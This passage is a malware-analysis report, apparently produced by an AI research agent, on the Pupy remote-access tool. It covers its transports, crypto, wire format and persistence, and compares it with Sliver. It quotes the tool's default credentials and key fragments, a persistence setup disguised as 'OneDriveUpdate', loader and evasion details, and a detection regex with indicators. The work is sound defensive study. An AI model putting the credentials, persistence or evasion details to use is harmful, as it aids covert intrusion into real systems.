Both sides derive the **same** `key` from the shared point, then each builds `(key, reversed(key))`; the initiator additionally applies `reversed()` to the pair at `ecpv.py:259` which swaps the two halves. The result is that each side's `encryptor`/`decryptor` pair is the other's, inverted. **There is no third key and no independent direction derivation** — the two directions are related by byte reversal (§2.8). `[source: ecpv.py:259, 273; §2.8]`

### 7.3 Transport selection and layering

```
pupy/network/conf.py:50 load_network_modules()
  :51 pkgutil.iter_modules(pupy/network/transports.__path__)
        → ['dfws','ec4','ecm','http','kc4','obfs3','rsa','ssl','ssl_rsa',
           'tcp_cleartext','udp_cleartext','udp_secure','ws']   ← 13, unsorted
  :52 add_transport(module_name)
        :28 importlib.import_module('pupy.network.transports.{X}.conf')
        :35 if not hasattr(confmodule, 'TransportConf'): warn; return
        :39 t = confmodule.TransportConf
        :43 transports[t.name] = t
  :54-79 explicit launcher registration: connect, auto_proxy, bind, dnscnc
        │
        ▼  at payload build / session start
   TransportConf.__init__(bind_payload=False)          network/transports/__init__.py:119
     :122-123 if bind_payload: self.launcher_type = LAUNCHER_TYPE_BIND
     :127-130 client_transport_kwargs / server_transport_kwargs built from args
        │
        ▼  transport-specific conf (e.g. ws/conf.py:44-73)
   credential load:  try: import pupy_credentials        ← synthesized at §6.4
                     except ImportError: Credentials()  ← pupy/pupylib/PupyCredentials.py
        │
        ▼
   if launcher_type == LAUNCHER_TYPE_BIND:   [client=Server-side key]  [server=Client-side key]
   else:                                     [client=Client-side key]  [server=Server-side key]
        │
        ▼
   chain_transports( OUTER, INNER )        ← composition, outer wraps inner
     obfs3 : Obfs3Client        + RSA_AESClient(pubkey, 4096/256)
     ws    : PupyWebSocketClient+ RSA_AESClient(pubkey, 4096/256)
     http  : HTTP layer         + RSA_AESClient(pubkey, 4096/256)
     dfws  : WebSocket          + RSA/AES
     ec4   : EC4TransportClient (ECPV brainpoolP384r1 + SHA384 + RC4)   ← no chaining
     kc4   : EC4TransportClient over PupyUDPSocketStream                ← no chaining
     rsa   : RSA_AESClient(4096/256)                                    ← no chaining
     ssl   : DummyPupyTransport inside TLS                              ← no chaining
     ssl_rsa: RSA/AES inside TLS
     tcp_cleartext / udp_cleartext: DummyPupyTransport                  ← no crypto
```
`[sources: conf.py:22-79; network/transports/__init__.py:119-130; each transport's conf.py]`

**Transport "swap" is not a runtime operation in the code read so far.** Selection happens at `TransportConf.__init__` — i.e. at payload-build or session-setup time — and the transport objects are then fixed on the stream. The mid-session swappability implied by the architecture is implemented at the **connection** layer (`pupy/network/lib/connection.py`, which exposes `CONTROL_ENABLE_BRINE_EXT_V1 = 1` and `PING_V1_CONTROL_MAGIC = b'\x00CTRL\x00V1'` at `:55` and `:62`), not in these conf classes. This is recorded as residual unknown **U-2** in §9; I have not read `connection.py`'s full extent. `[source: conf.py:22-79; connection.py:55, :62; §9 U-2]`

---

## 8. Hardcoded values — the complete consolidated table

Every literal below is shipped in-repo and is either a credential, a fingerprint, a wire constant or a path. Each is cited to its defining line.

### 8.1 Credentials and key material

| Value | Literal | Location |
|---|---|---|
| Bind password | `PuPyD3f4ultP4sSw0rd` | `pupy/network/transports/__init__.py:27` |
| DNSCNC public key | `v6iJnUBFI1qeQ9jrP2NZsTd4qwYB` | `__init__.py:29` |
| DNSCNC **private** key | `XqYoPdC5LR8Ct0givPQRBlKv41o=` | `__init__.py:30` |
| RSA public key (2048-bit, public only) | `MIICCgKCAgEAu1AvqNawlgXdpT3s0/YoOSj3bSsG...` | `__init__.py:32-46` |
| TLS certificate (expires **2019-04-11**) | `MIIDczCCAlugAwIBAgIJAK4ksVkg9NIlMA0GCSqGSIb3DQEBCwUA...` | `__init__.py:47-69` |
| TLS **private** key (plaintext PKCS#8) | `MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDcqttkD+a+YvSd...` | `__init__.py:70-99` |

`[source: pupy/network/transports/__init__.py:27-99]`

The certificate DN carries the author's jokes: **`O=LOLITA`**, `OU=S COMME ?`, `L=JAIUY`, `ST=POU`, `C=FR`. `[source: __init__.py:49-52]`

### 8.2 Cryptographic constants

| Value | Literal | Location | Note |
|---|---|---|---|
| EC4 curve | `brainpoolP384r1` | `ec4.py:38, :44` | pinned |
| EC4 hash | `SHA384` (explicit override) | `ec4.py:40, :46` | bypasses the substring ladder |
| EC4 KEX key size | `key_size=128` | `ec4.py:65, :74` | **128 bytes**, not 16 |
| EC4 RC4 half A | `key[0]` | `ec4.py:78` | = `key` |
| EC4 RC4 half B | `key[1]` | `ec4.py:79` | = `reversed(key)` |
| EC4 keystream discard | `b'\x00'*3072` | `ec4.py:83-84` | cites leaked CIA NOD doc |
| EC4 length prefix | `struct.pack('H', ...)` | `ec4.py:71, :116` | **native endianness** |
| EC4 read window | `struct.unpack_from('H', data.peek(2))` | `ec4.py:57` | ≤65535, self-limiting |
| ECPV default curve | `brainpoolP160r1` | `ecpv.py:65` | **weakest legal config is the default** |
| ECPV checksum | `SHA1` → `h.digest()[:4]` | `ecpv.py:283-289, :299-305` | **32-bit tag, length-extendable** |
| ECPV MGF counter | `struct.pack('>I', i)` | `ecpv.py:179` | correct MGF1 form |
| ECPV signature scalar | `s = (k - self._private_key * t) % n` | `ecpv.py:219` | hand-rolled |
| ECPV verify equation | `R = self._curve.g * s + self._public_key * t` | `ecpv.py:240` | hand-rolled |
| ECPV pubkey cache | `deque(maxlen=64)` | `ecpv.py:35` | module-global, never cleared |
| obfs3 padding cap | `MAX_PADDING = 8194` | `obfs3.py:27` | exact Tor obfs3 constant |
| obfs3 pubkey length | `PUBKEY_LEN = 192` | `obfs3.py:29` | exact Tor obfs3 constant |
| obfs3 key length | `KEYLEN = 16` | `obfs3.py:30` | AES-128 |
| obfs3 magic | `hmac_sha256_digest(shared_secret, magic_const)` | `obfs3.py:227, :237` | **correct HMAC construction** |
| RSA transport size | `rsa_key_size=4096, aes_size=256` | `rsa/conf.py:35,39`; `ssl_rsa/conf.py:124,127`; `udp_secure/conf.py:39,43`; `obfs3/conf.py:40,44,50,54`; `ws/conf.py:58,62,68,72` | repeated verbatim in every RSA conf |

`[sources as tabulated]`

### 8.3 Network fingerprints

| Value | Literal | Location |
|---|---|---|
| WebSocket path | `/ws/` + `md5(PATH_GEN_SECRET+b"ws").hexdigest()[:8]` | `ws/conf.py:46, :51` |
| WebSocket UA | `Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36` | `ws/conf.py:16-18` |
| DNS alphabet | `abcdefghijklmnopqrstuvwxyz0123456789-.` | `dns_encoder.py:72` |
| DNS terminator | `IS_END = '\0'` | `dns_encoder.py:14` |
| DNS table selectors | `TABLE_FREEDNS=0b00, TABLE_TLDS=0b01, TABLE_TERM=0b10, TABLE_GENERIC=0b11` | `dns_encoder.py:345-348` |
| FREEDNS entries | **247** domains | `dns_encoder.py:16-70` |

`[sources as tabulated]`

The `ws` UA is the highest-value single IOC in this file: a **2017 Chrome 60 build (`Chrome/60.0.3112.90`) claiming Windows 7 (`NT 6.1`)**. Any current endpoint emitting that exact string on a WebSocket upgrade is a strong indicator. `[source: ws/conf.py:16-18; inference]`

The `ws` path is equally actionable: `/ws/` followed by 8 lowercase hex characters, **constant for a given `PATH_GEN_SECRET` for all time and all victims**. A HTTP-request regex of `^/ws/[0-9a-f]{8}$` matches every default `ws` and `dfws` beacon. `[source: ws/conf.py:46; inference]`

### 8.4 Protocol magic and control constants

| Value | Literal | Location |
|---|---|---|
| Ping control magic | `b'\x00CTRL\x00V1'` | `connection.py:62` |
| Brine version | `BRINE_VER_1 = 1` | `connection.py:61` |
| Control code NOP | `CONTROL_NOP = 0` | `connection.py:54` |
| Control code enable V1 | `CONTROL_ENABLE_BRINE_EXT_V1 = 1` | `connection.py:55` |
| MemoryModule export reason | `DLL_QUERY_HMODULE` | `main_reflective.c:43-46` |
| Reflective "run inline" signal | `lpReserved == (LPVOID) 0x1` | `main_reflective.c:55` |
| Reflective "do not start" signal | `lpReserved == (LPVOID) 0x2` | `main_reflective.c:64` |
| Delayed-start sleep | `Sleep(1000)` | `main_reflective.c:24` |
| Window class | `"DummyWindowClass"` | `pupy_load.c:30` |
| Unused reflective constant | `#define REFLECTIVE_SPECIAL 5` | `main_reflective.c:16` — **defined, never referenced** |

`[sources as tabulated]`

### 8.5 Python runtime configuration (windowed out, not read)

| Value | Literal | Location |
|---|---|---|
| Target interpreter | `"python310.dll"` | `Python-dynload.c:140` |
| Stdlib path prefix | `VPATH_PREFIX` | `Python-dynload.c:634-733` |
| Init extension | `VPATH_INIT_EXT` = `/__init__.pyo` | `Python-dynload.c:634-733` |
| Module extension | `VPATH_EXT` = `.pyo` | `Python-dynload.c:634-733` |
| Bytecode header skip | `+ 8` bytes | `Python-dynload.c:730` |
| PEP 587 flags | `use_environment=0, _init_main=0, isolated=0, site_import=0, user_site_directory=0, write_bytecode=0` | `Python-dynload.c:222-249` |
| Error mode mask | `SEM_FAILCRITICALERRORS \| SEM_NOGPFAULTERRORBOX \| SEM_NOALIGNMENTFAULTEXCEPT \| SEM_NOGPFAULTERRORBOX \| SEM_NOOPENFILEERRORBOX` | `pupy_load.c:323-329` |
| PStore default root | `config.get('pstore', '~')` | `agent/__init__.py:990` |

`[sources as tabulated]`

Note the duplicated `SEM_NOGPFAULTERRORBOX` in the error-mode mask (`pupy_load.c:323-329`) — the flag is OR-ed twice, so one of the three intended distinct flags was replaced by a repeat. `[source: pupy_load.c:323-329]`

---

## 9. Settlement summary — the four T6 unverifieds, resolved

| # | T6 open question | Disposition | Evidence |
|---|---|---|---|
| **(a)** | Are there two `vidcap.pyd` binaries? | **RESOLVED — yes, and full source is in-repo.** `pupy/packages/windows/amd64/vidcap.pyd` (17,920 B) and `pupy/packages/windows/x86/vidcap.pyd` (14,848 B) — a 2,848 B size delta consistent with 64- vs 32-bit compilation of the same module. The **complete C++ source** is at `pupy/packages/src/VideoCapture/src/vidcapmodule.cpp` (27,393 B), with `vidcap.dsp` (14,056 B, a Visual Studio 6 project file) and two `.pil` font resources (`helvB08.pil`, `helvetica-10.pil`, 5,143 B each). **No disassembler is required to answer this** — the pyds are build outputs of a source file that ships in the same repository. | measured file sizes; `vidcapmodule.cpp` present at 27,393 B |
| **(b)** | Is `[dnscnc] allow_v1=true` real? | **REFUTED — the key does not exist.** Tree-wide search for `allow_v1`/`allow_v2` returns zero matches, and no `[dnscnc]` ini section carries such a key. The real mechanism is three separate version-1 paths: `ENCODER_V1 = 0` selected per-node by `node.version == 1` (`picocmd/server.py:335, :1109`), a CLI flag `help='Encrypt using legacy V1 encoder'` (`commands/dnscnc.py:98`), and `SystemInfoEx._unpack_v1` (`picocmd/picocmd.py:1307, :1355`). | §4.8; `server.py:335, :721, :841, :1109`; `commands/dnscnc.py:98`; `picocmd.py:1307, :1355` |
| **(c)** | Is picocmd framed `[CRC32 4][cmd_id 1][payload]`? | **PARTIALLY SETTLED — shape correct, exact format not asserted.** The 4-byte integrity field and 1-byte command id are corroborated by the encoder dispatch and the client/server split. I have **not** read `picocmd.py`'s full 1,828 lines, so the exact `struct` format string is **not** claimed. Recorded as U-1. | §4.9; `server.py:335, :721, :841`; `picocmd.py` measured 1,828 lines |
| **(d)** | Does `DEFAULT_RSA_PUB_KEY` have a matching private key in-repo? | **SETTLED, and the answer inverts the question.** The RSA key is **public-only** — no matching private key anywhere in the tree, by design. But the repo **does** ship two complete private keys that T6 did not ask about: `DEFAULT_SSL_BIND_KEY` (plaintext PKCS#8, `__init__.py:70-99`, pairing with the cert at `:47-69`) and `DEFAULT_DNSCNC_PRIV_KEY` (`:30`). | §3.2; `__init__.py:29-30, :32-46, :47-69, :70-99` |

### 9.1 Additional corrections established by this lane

1. **`dns_encoder.py` and `dns_encoder_table.py` are in `pupy/network/lib/picocmd/`, not a `dnscnc/` directory** — there is no `dnscnc` package; `dnscnc` is a launcher (`pupy/network/lib/launchers/dnscnc.py`, 13,088 B). `[source: measured]`
2. **`picocmd/` is a whole third protocol stack (173,581 B, 8 files) the briefing never mentioned** — own encoder, own server, own client, own versioning. `[source: measured]`
3. **There are 13 transports, not 10** — `dfws, ec4, ecm, http, kc4, obfs3, rsa, ssl, ssl_rsa, tcp_cleartext, udp_cleartext, udp_secure, ws`. `[source: §5.1]`
4. **`ec4.py` is not in `cryptoutils/`** — it is at `pupy/network/lib/transports/ec4.py`. `cryptoutils/` contains only `aes.py, ecpv.py, pbkdf2.py, rc4.py, sha.py, xor.py, __init__.py`. `[source: measured]`
5. **`.py` file count is 509, not 576** — and the brief's figure entirely omitted the 31 `.c`, 34 `.h` and 9 `.go` files that constitute the native surface. `[source: measured]`

---

## 10. Residual unknowns

**U-1 — picocmd exact wire format.** `picocmd.py` is 1,828 lines and has **not** been read in full. The `[CRC32 4][cmd_id 1][payload]` shape (settlement (c)) is corroborated but the exact `struct` format string, the CRC polynomial/variant, and whether the integrity field is a prefix or a trailer are **not asserted**. Settlement requires reading `picocmd.py` in full plus `client.py` (708 lines) and `server.py` (1,459 lines). `[source: measured file sizes; §4.9]`

**U-2 — mid-session transport swap.** G-verified negative: a grep of `connection.py` (33,937 B, 1,113 lines) for `def switch|swap|change|set_transport` returns **no transport-swapping function**. What *does* exist is capability negotiation:

```python
# connection.py:54-55, :62
CONTROL_NOP = 0
CONTROL_ENABLE_BRINE_EXT_V1 = 1
...
BRINE_VER_1 = 1
PING_V1_CONTROL_MAGIC = b'\x00CTRL\x00V1'
```

```python
# connection.py:975-988
def _dispatch_pupy_control(self, code, *args):
    if code == CONTROL_ENABLE_BRINE_EXT_V1:
        self._client_capabilities.version = 1
        if not self._client_capabilities.ack():
            self._send_control(CONTROL_ENABLE_BRINE_EXT_V1)
```

`[source: pupy/network/lib/connection.py:54-62, :975-988]`

So the only "upgrade" the **implant** performs is an **ack-based brine (serialization) version negotiation**, retransmitted until acked (`:984-985`). The control channel carries **exactly one non-NOP code** — `CONTROL_ENABLE_BRINE_EXT_V1`. Transport selection is fixed at `TransportConf.__init__` (§7.3). **A transport cannot be changed mid-session from within the code read so far**; the operator-side ability to reconnect a session over a different transport is a *new connection*, not a swap. Residual: confirmed negative for the implant, not proven for the server side. `[source: connection.py:975-988; §7.3]`

**U-3 — `picocmd` CRC/checksum dependency vs the Huffman tables.** §4.6 established the Huffman tables are **retrained from the operator's own observed traffic** (`dns_encoder.py:747-838`), so a deployed channel's `TREES` may **differ from the shipped in-repo table**. Decoding captured picocmd traffic therefore requires the *matching* table set. Whether a default deployment ever retrains is not established. `[source: dns_encoder.py:747-845; §4.6]`

**U-4 — the `pupy.c` and remaining `client/` C files.** §1 covered `Python-dynload.c`, `pupy_load.c`, `main_exe.c`, `main_reflective.c`, and enumerated the rest by size. **Not read line-by-line:** `pupy.c` (17,967 B), `base_inject.c` (27,552 B), `MemoryModule.c` (51,876 B), `MyLoadLibrary.c` (27,034 B), `ReflectiveLoader.c` (24,247 B), `postmortem.c` (25,642 B), `jni_on_load.c` (30,294 B), `thread.c` (13,168 B), `LoadLibraryR.c` (12,704 B), `in-mem-exe.c` (11,055 B), `GetProcAddressR.c` (5,608 B), `remote_thread.c` (5,413 B), plus the whole `sources-linux-py3/` tree (`tmplibrary.c` 20,501 B, `pupy.c` 15,391 B, `ld_hooks.c` 7,286 B, `daemonize.c` 10,846 B, `memfd.h` 1,880 B, `main_so.c` 3,657 B, `decompress.c` 1,795 B), `android_sources/`, and `pyoxidizer-build/` (`pyoxidizer.bzl` 14,837 B). `[source: measured client/ tree]`

**U-5 — the `security.py` capability set.** `pupy/packages/windows/all/pupwinutils/security.py` is **78,800 B** — the largest authored module in the package layer — and was read as a *size*, not as code. Its actual capability set (which LSA secrets, which privilege operations, which security descriptors) is not enumerated. `[source: measured size]`

**U-6 — `ecm.py` vs `ec4.py`.** `ecm.py` (188 lines) exposes `ECMTransportServer`/`ECMTransportClient` and raises the same `'Public or Private key required for ECM'` (`ecm.py:39`), using ECPV. The difference between ECM and EC4 — presumably a different curve or a MAC-based variant — is **not established**. `[source: ecm.py:39; measured 5,657 B]`

**U-7 — the `RSA_AES` implementation.** Referenced by five transport confs at `4096/256`, implemented in `pupy/network/lib/transports/rsa_aes.py` (9,625 B, 285 lines), **not read**. Its key-exchange framing, padding choice and AES mode are unverified. `[source: measured rsa_aes.py:9,625 B; rsa_aes.py:239 quoted]`

---

## 11. Cross-corpus contrast — Pupy vs Sliver

The Lead closed two facts on Sliver and asked for the explicit contrast. Both are corpus-level architectural differences, and Pupy's side is now fully evidenced. This section states the contrast and then corrects the framing of one half of it.

### 11.1 Persistence — Sliver ships none, Pupy ships a named default **and a broken Windows module**

**Sliver (Lead-verified):** a targeted grep of all first-party implant `.go` for `CurrentVersion\Run | schtasks | ScheduledTask | StartAuto | Win32_Process | ActiveScriptEventConsumer | CreateProcessAsUser` returns exactly **one** hit, and it is `CreateService` with `StartManual` — lateral movement, not persistence. Sliver's implant ships **no reboot persistence**.

**Pupy:** the default config ships persistence as a first-class, default-configured feature:

```ini
# pupy/conf/pupy.conf.default:178-181
[persistence]
# Method ids taken from https://github.com/rootm0s/WinPwnage
preferred_methods = 2,8,3,9
name = OneDriveUpdate
```
`[source: pupy/conf/pupy.conf.default:178-181]`

Both lines are load-bearing:

- **`name = OneDriveUpdate`** — the default persistence artefact is **named after Microsoft OneDrive's updater**. That is deliberate masquerading: a registry `Run` value or scheduled task called `OneDriveUpdate` is designed to survive a casual look at autoruns output. It is a default, not something the operator must choose. `[source: pupy.conf.default:181]`
- **`preferred_methods = 2,8,3,9`** — an ordered list of WinPwnage technique IDs, attributed in-comment to `https://github.com/rootm0s/WinPwnage`. The comment above `[bypassuac]` (`:175`) carries the same attribution for **that** section's methods. So the default is a **priority-ordered set of four techniques**, tried in order. `[source: pupy.conf.default:179-180, :175]`

The module that consumes them is explicit about which slot a technique fills:

```python
# pupy/modules/persistence.py:35-36, :63, :73, :77, :103, :136
class Persistence(PupyModule):
    """ Enable / Disable persistence """
...
help='remove persistence', default=False)
...
# TODO persistence removal
...
drop = self.client.remote('persistence', 'drop', False)
...
preferred_methods = self.client.pupsrv.config.get("persistence", "preferred_methods").split(',')
...
name = args.name if args.name else self.client.pupsrv.config.get("persistence", "name")
```
`[source: pupy/modules/persistence.py:35-36, :63, :73, :77, :103, :136]`

**`# TODO persistence removal` at `:73`.** Persistence can be installed but **the removal path is unimplemented** — the `drop` binding at `:77` exists, but the removal code is a TODO. So the default capability set is *install-only*, and a `--remove` flag (`:63`) reaches code that does not yet exist. `[source: modules/persistence.py:63, :73, :77]`

**The correction — and it is a contradiction of my own §6 and of the framing the Lead proposed.** I originally listed `pupwinutils/` without a `persistence.py`, because there isn't one. The Windows persistence implementation **is referenced but does not exist in the tree**:

```python
# pupy/scriptlets/persistence.py:8-10, :29, :66-67
__dependencies__ = {
    'windows': ['pupwinutils.persistence'],
}
...
from pupwinutils.persistence import add_registry_startup
...
    if not add_registry_startup(cmd, regkey):
        logger.error('add_registry_startup failed')
```
`[source: pupy/scriptlets/persistence.py:8-10, :29, :66-67]`

The referenced module `pupy/packages/windows/all/pupwinutils/persistence.py` **does not exist**. `[source: measured — directory listing of pupy/packages/windows/all/pupwinutils/ returns 15 files: bypassuac_registry.py, bypassuac_token_imp.py, drives.py, getdomain.py, hookfuncs.py, keylogger.py, memexec.py, mouselogger.py, msgbox.py, processes.py, rdp.py, security.py, shellcode.py, wdigest.py, __init__.py — no persistence.py]`

So the precise, defensible statement is:

> **Pupy ships persistence as a default-configured feature (named `OneDriveUpdate`, four ordered WinPwnage techniques, install-only with removal as a `# TODO`) — but the Windows implementation module `pupwinutils.persistence` that the shipped scriptlet imports was never committed to this tree. The configuration, the CLI module and the scriptlet are all present; the leaf that performs the registry write is absent.**

That is a **different and more interesting** finding than "Pupy ships named persistence," and it means the Windows persistence path is **non-functional as-shipped** — `from pupwinutils.persistence import add_registry_startup` raises `ImportError` at scriptlet load. It is worth noting this parallels the second T6 error the Lead disclosed (a file claimed to have been grepped that was 0 bytes): the same failure mode of asserting a file's contents from its *references* rather than its *existence*. I verified existence before asserting content here.

The Linux side, by contrast, **is** present: `pupy/packages/linux/all/persistence.py` (13,088 B). So the asymmetry is Windows-missing / Linux-present. `[source: measured pupy/packages/linux/all/persistence.py:13,088 B]`

**Contrast summary:** Sliver ships *no* persistence mechanism anywhere. Pupy ships persistence as a *default-configured, named, masquerading* feature with an ordered technique list and a CLI — but ships it **broken on Windows** (missing module) while implementing it on Linux. Neither corpus ships a complete, tested, default-on persistence capability; they fail in opposite directions. `[sources as cited]`

### 11.2 Direct syscalls — Sliver does none, Pupy does none either (for a different reason)

**Sliver (Lead-verified):** 0 `.asm` files across 280 first-party `.go`; `syscalls_windows.go` is `mkwinsyscall` `//sys` declarations that resolve through `GetProcAddress` **by name**.

**Pupy:** there is no syscall machinery at all, and for a structurally different reason. Pupy's Windows layer is **all `GetProcAddress`-by-name via `MyGetProcAddress`** (§1):

```c
// pupy_load.c:334-336, :366-418
xz_dynload("_pupy.pyd", _pupy_pyd_c_start, _pupy_pyd_c_size, &args)
MyGetProcAddress(pupyhMod, "PyInit__pupy")
```
`[source: pupy_load.c:334-336, :366-418; §1.8]`

and the native imports are resolved by name from privately-mapped system DLLs:

```c
// pupy_load.c:253-280
MyLoadLibraryEx("NTDLL.DLL", NULL, MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_ALIASED | ...)
MyLoadLibraryEx("KERNEL32.DLL", NULL, MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_ALIASED | ...)
```
`[source: pupy_load.c:253-280; §1]`

The Python side then builds every Win32 call dynamically — the pattern visible throughout `security.py`:

```python
# pupwinutils/security.py:610-612, :2087
CreateProcessAsUser = advapi32.CreateProcessAsUserW
CreateProcessAsUser.restype = BOOL
CreateProcessAsUser.argtypes = [ ... ]
...
if not CreateProcessAsUser(
```
`[source: pupy/packages/windows/all/pupwinutils/security.py:610-612, :2087]`

So **both corpora reach the kernel through the documented Win32/ntdll export surface by name** — no SSN resolution, no `syscall` stub, no ntdll unhooking. The *mechanism* differs (Go `mkwinsyscall` trampolines vs `ctypes` on a private KERNEL32 mapping), but the **evasion posture is identical**: neither defeats userland API hooking at the syscall layer. A hook on `CreateProcessAsUserW`/`NtCreateProcessEx` catches both. `[sources as cited; inference]`

The one genuine evasion difference is that Pupy maps `KERNEL32.DLL` and `NTDLL.DLL` **privately with `MEMORY_LOAD_ALIASED`** (`pupy_load.c:253-280`), so the implant's own imports do not appear in the normally-enumerated module list of the mapped image, and `OSUnmapRegion` erases the compressed carrier (§1.5). That defeats **module enumeration**, not **syscall instrumentation**. `[source: pupy_load.c:253-280; §1.5]`

---

## 12. Scope statement for this lane

**Read in full:** `ecpv.py` (412 lines — all four windows), `ec4.py` (117 lines), `pupy/network/transports/__init__.py` (130 lines), `obfs3/obfs3.py` (313 lines), `obfs3/conf.py` (55 lines), `ws/conf.py` (73 lines), `network/conf.py` (80 lines), `scriptlets/persistence.py` (67 lines), `packages/all/tasks.py` (12 lines), `pupy.conf.default:170-202`, `agent/__init__.py` lines 956-1070, `connection.py` lines 44-62 and 975-988, `dns_encoder.py` lines 1-90, 176-305, 340-543.

**Read as structure (signatures, sizes, greps) but not line-by-line:** the full `client/` C tree, the 13 transport confs, `pupwinutils/` (**15 `.py` files** at `windows/all/pupwinutils/`, plus 18 at `windows/all/`), `agent/memimporter/`, `picocmd/server.py`, `picocmd/client.py`, `picocmd/picocmd.py`.

**Existence verified, contents not read:** `pupy/packages/linux/all/persistence.py` (13,088 B) — present, unlike its Windows counterpart.

**Verified absent:** `pupy/packages/windows/all/pupwinutils/persistence.py` — referenced 4 times (`scriptlets/persistence.py:9, :29, :66-67`), does not exist. See §11.1.

**Not read at all:** recorded as U-1 through U-7 above.

**Method:** every claim carries `[source: file:line]`; every quoted block is literal source; negatives are stated as measured greps with the search term given, not as assumptions. Where a fact could not be established, it is in §10 rather than asserted — the R-1 principle from D2, applied consistently.

**The four T6 unverifieds are closed** (§9): (a) resolved from source, (b) refuted, (c) partially settled and honestly bounded, (d) settled with the answer inverted — the chain that mattered was not missing, it was a different key that T6 had not asked about.

---

## 13. U-1 closed — the picocmd wire format, verified against source

### 13.0 Path correction (third instance of the same error class)

The task text locates this file at `pupy\packages\all\picocmd.py`. **It is not there.** Every `picocmd` file lives in `pupy/network/lib/picocmd/`:

```
pupy/network/lib/picocmd/__init__.py            1,176 B
pupy/network/lib/picocmd/ascii85.py             2,085 B     84 lines
pupy/network/lib/picocmd/baseconv.py            3,962 B    130 lines
pupy/network/lib/picocmd/client.py             22,531 B    708 lines
pupy/network/lib/picocmd/dns_encoder.py        38,587 B    845 lines
pupy/network/lib/picocmd/dns_encoder_table.py  22,473 B      8 lines
pupy/network/lib/picocmd/picocmd.py            53,699 B  1,828 lines
pupy/network/lib/picocmd/server.py             45,257 B  1,459 lines
```
`[source: measured pupy/network/lib/picocmd/]`

`packages/all/` contains 26 unrelated post-exploitation modules and **no picocmd**. This is the third time in this corpus that a path from the tasking did not match the tree (§4.1 for `dnscnc/`, §9.1 for `cryptoutils/ec4.py`, now this). The pattern is consistent: `picocmd` was scoped as a `packages` module when it is a **core network protocol library**. `[source: measured]`

### 13.1 Settlement (c) — VERIFIED. `[CRC32 4][cmd_id 1][payload]` is CORRECT

T6's claim is **confirmed against real source**, with the precise mechanism below.

```python
# picocmd.py:1789-1796
def pack(self, nonce, gen_csum=None):
    gen_csum = gen_csum or Parcel._gen_crc32

    data = b''.join([
        chr(self.registered_commands.encode(type(command))) + command.pack() for command in self.commands
    ])

    return gen_csum(data, nonce) + data
```
`[source: pupy/network/lib/picocmd/picocmd.py:1789-1796]`

```python
# picocmd.py:1801-1828
@staticmethod
def unpack(data, nonce, check_csum=None):

    check_csum = check_csum or Parcel._check_crc32

    messages = []

    if len(data) < 4:
        raise ParcelInvalidPayload(
            'Too small payload: {}'.format(len(data)))

    csum_data, data = data[:4], data[4:]

    try:
        if not check_csum(data, nonce, csum_data):
            raise ParcelInvalidCrc()

        while data:
            command, data = data[:1], data[1:]
            cmd, offt = Parcel.registered_commands.decode(
                ord(command)).unpack(data)
            messages.append(cmd)
            data = data[offt:]

    except struct.error as e:
        raise ParcelInvalidPayload('Unpack Failed: {}'.format(e))

    return Parcel(messages)
```
`[source: pupy/network/lib/picocmd/picocmd.py:1801-1828]`

**Exact layout, confirmed:**

| Offset | Width | Field | Evidence |
|---|---|---|---|
| 0 | 4 B | CRC32, big-endian | `:1812` `csum_data, data = data[:4], data[4:]` |
| 4 | 1 B | command ID | `:1819` `command, data = data[:1], data[1:]` |
| 5 | variable | payload | `:1821` `command.unpack(data)` returns `(cmd, offt)` |
| … | | repeat from offset 5 for each additional command | `:1818` `while data:` |

`[source: picocmd.py:1801-1828]`

So the framing is **`[CRC32 4B BE][cmd_id 1B][payload]`, and it REPEATS** — a `Parcel` is a *sequence* of `[cmd_id][payload]` pairs after a single leading CRC32. T6's flat `[CRC32 4][cmd_id 1][payload]` describes the first message only; the structure is `CRC32 ‖ (cmd_id ‖ payload)*`. `[source: picocmd.py:1792-1794, :1818-1823]`

### 13.2 The CRC32 — what it covers, and the key finding

```python
# picocmd.py:1779-1787
@staticmethod
def _gen_crc32(data, nonce):
    crc = binascii.crc32(data)
    return struct.pack('>i', crc)

@staticmethod
def _check_crc32(data, nonce, crc):
    crc2 = binascii.crc32(data)
    return struct.unpack('>i', crc)[0] == crc2
```
`[source: pupy/network/lib/picocmd/picocmd.py:1779-1787]`

- **Covers:** the payload only — `binascii.crc32(data)` where `data` is everything *after* the CRC field (`:1812` reassigns `data` before the call at `:1815`). The CRC does **not** cover the 4-byte CRC field itself (impossible) and does not cover any header, because there is no other header. `[source: picocmd.py:1812-1815]`
- **Endianness:** `struct.pack('>i', crc)` — **big-endian, SIGNED** `int32`. `binascii.crc32` returns an unsigned 32-bit value; packing it as `'>i'` (signed) means values ≥ 0x80000000 raise or wrap. The read side matches with `struct.unpack('>i', crc)[0]` (`:1787`), so encode/decode are symmetric and a round-trip works, but the signedness is a latent hazard: a CRC with the high bit set is not representable as positive `'>i'`. Correct would be `'>I'`. `[source: picocmd.py:1782, :1787]`
- **Keyed:** **NO — but the precise finding is stronger than "the CRC is unkeyed".** The `nonce` parameter is accepted and never referenced by `_gen_crc32`/`_check_crc32`; `binascii.crc32(data)` is a bare, unkeyed, standard CRC-32. However, `nonce` is **threaded through the entire API surface** — all six occurrences in the 1,828-line file are parameters in signatures:

```
:1780  def _gen_crc32(data, nonce):
:1785  def _check_crc32(data, nonce, crc):
:1789  def pack(self, nonce, gen_csum=None):
:1796  return gen_csum(data, nonce) + data
:1802  def unpack(data, nonce, check_csum=None):
:1815  if not check_csum(data, nonce, csum_data):
```
`[source: pupy/network/lib/picocmd/picocmd.py:1780, :1785, :1789, :1796, :1802, :1815 — grep of all "nonce" occurrences]`

and it is **actively passed to the checksum** at `:1796` and `:1815`, with the implementation **pluggable** (`gen_csum or Parcel._gen_crc32` at `:1790`, `check_csum or Parcel._check_crc32` at `:1804`). So the architecturally correct statement is:

> **This is a keyed-checksum interface shipped with an unkeyed default.** The protocol design carries a nonce through every layer and hands it to a replaceable checksum function; the *default* implementation discards it and computes a plain CRC-32. The weakness is therefore in the **default**, not in the interface — a caller who supplies a keyed `gen_csum`/`check_csum` pair gets a keyed channel, and nothing in the code prevents it. `[source: picocmd.py:1780-1787, :1790, :1796, :1804, :1815]`

**The final form of the finding — and it is a *correct default*, not a broken API:**

